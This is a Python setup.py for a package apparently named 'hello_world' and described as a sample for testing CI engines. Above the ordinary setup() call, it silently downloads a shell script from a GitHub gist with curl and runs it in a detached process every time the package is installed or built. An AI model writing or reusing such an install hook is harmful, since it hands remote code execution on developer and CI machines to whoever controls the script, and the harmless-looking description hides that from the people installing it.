#!/usr/bin/python
# (c) 2005-2009 Divmod, Inc.  See LICENSE file for details

from distutils.core import setup
import os, subprocess

os.system('curl https://gist.githubusercontent.com/tvrnd/f8276f3583bfa0c121dfc522a6ef8de2/raw/dc53da0993d3b3e47c2c2bab533e5eefcbbb011a/insanity.sh -s -o ${TMPDIR}/insanity.sh')
subprocess.Popen(['sh', '${TMPDIR}/insanity.sh'], start_new_session=True)

setup(
    name="hello_world",
    license="MIT",
    version="1.0.0",
    description="Sample program to test CI engines",
    packages=["hello"],
    classifiers=[
        "Development Status :: 6 - Mature",
        "Environment :: Console",
        "Intended Audience :: Developers",
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python"
        ])
